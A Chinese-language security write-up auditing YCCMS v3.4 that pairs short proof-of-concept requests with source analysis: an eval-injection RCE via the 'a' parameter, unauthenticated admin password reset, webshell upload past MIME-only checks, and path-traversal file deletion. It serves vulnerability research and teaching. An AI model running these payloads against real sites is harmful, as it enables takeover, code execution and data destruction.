##  环境搭建

### 源码下载

CMS下载地址: http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar

###  mvc

该CMS采用的是MVC框架,MVC全名是Model View Controller，是模型(model)－视图(view)－控制器(controller)的缩写。用一种业务逻辑、数据、界面显示分离的方法组织代码，将业
务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑。controller文件夹存放控制器文件,view文件夹存放视图文件,model文件夹存放数据文件
[![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061435927.png)](https://xzfile.aliyuncs.com/media/upload/picture/20200510140732-8920d82a-9284-1.png)

##  命令执行-RCE

###  POC

```
/admin?a=Factory();phpinfo();//../
```

![image-20220306143529038](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061435121.png)

###  源码分析

`/public/class/Factory.class.php`

```
<?php
class Factory{
	static private $_obj=null;
	static public function setAction(){
		$_a=self::getA();
		if (in_array($_a, array('admin', 'nav', 'article','backup','html','link','pic','search','system','xml','online'))) {
			if (!isset($_SESSION['admin'])) {
				header('Location:'.'?a=login');
			}
		}
		if (!file_exists(ROOT_PATH.'/controller/'.ucfirst($_a).'Action.class.php')) $_a = 'Login';
		eval('self::$_obj = new '.ucfirst($_a).'Action();');
		return self::$_obj;
	}
	
	static public function getA(){
		if(isset($_GET['a']) && !empty($_GET['a'])){
			return $_GET['a'];
		}
		return 'login';
	}
}

?>
```

`$_a`为`$_GET['a']`传入的值。

然后经过`file_exists`判断文件是否存在。如果不存在的话，` $_a = 'Login'`,存在的话，就直接执行`eval语句`。`$_a`是我们的控制点，我们需要通过eval来执行$_a的语句。



分析payload`a=Factory();phpinfo();//../`。其中`Factory()`是用来闭合前面的`new`,然后`eval`中可以执行多个语句，我们利用利用分号`;`执行多个语句。

最后面的`/../`,该函数允许传入路径中含有特殊符号，当目录中含有`/../`时会将第一个`/`前的内容当作一个目录处理，而他本身会返回上一个目录，这样就造成了中间字符的逃逸。`//../`也就满足了`file_exists`目录存在。



类被加载的地方，在`config/run.inc.php`，同时该文件在`admin/index.php`被文件包含，所以直接在admin/index.php,就可以执行payload

![image-20220306144533892](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061445969.png)

## 未授权管理员密码修改

### POC

```
POST /admin/?a=admin&m=update HTTP/1.1
username=admin&password=123456&notpassword=123456&send=%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81
```

![image-20220306145453927](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061454996.png)

看数据库中的`my_admin`,修改成功

![image-20220306151949206](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061519257.png)

###  源码分析

![image-20220306152106553](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061521767.png)

`send`的赋值随意，只有存在就行。

然后我们跟进`editAdmin()`函数

![image-20220306152708340](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061527452.png)

跟进父类的`update`函数

![image-20220306152839611](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061528655.png)

修改密码，这三段都没有对用户身份的验证，从而达到任意修改管理员密码。

登录成功。

![image-20220306152955170](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061529248.png)

##  文件上传--1

### POC

直接写马上传

![image-20220306153625108](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061536179.png)



访问`view/index/images/logo.php`

![image-20220306153610792](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061536860.png)

### 源码分析

定位到`controller/CallAction.class.php`

![image-20220306154445037](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061544367.png)



跟进`LogoUpload`，在`public/class/LogoUpload.class.php`

```
private $typeArr = array('image/png','image/x-png');

//验证类型
	private function checkType() {
		if (!in_array($this->type,$this->typeArr)) {
			Tool::alertBack('警告：LOGO图片必须是PNG格式！');
		}
	}
	

```

只对上传文件类型检验了，所以直接传马。

##  文件上传 --2

### POC

![image-20220224155934985](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061547199.png)

还是一样的

### 源码分析

定位到`controller/CallAction.class.php`

![image-20220306154905684](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061549834.png)



跟进`FileUpload`

```
private $typeArr = array('image/jpeg','image/pjpeg','image/png','image/x-png','image/gif');		//类型合集

//验证类型
	private function checkType() {
		if (!in_array($this->type,$this->typeArr)) {
			Tool::alertBack('警告：不合法的上传类型！');
		}
	}
```

还是只对上传文件类型检验了。

##  任意文件删除

###  POC

```
pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87
```

![image-20220306155527603](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061555660.png)

只需要更改pid[0]即可在无登录条件下任意删除文件，删除根目录下的1.txt

![image-20220306155613040](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061556107.png)

成功删除

![image-20220306155629765](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061556823.png)

###  源码分析

位置为`/controller/PicAction.class.php`

![image-20220306155946571](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203061559765.png)

对`pid`没有过滤，直接拼接路径，然后通过`unlink`删除一个文件。

##  参考文章

https://blog.csdn.net/cosmoslin/article/details/123178882?spm=1001.2014.3001.5502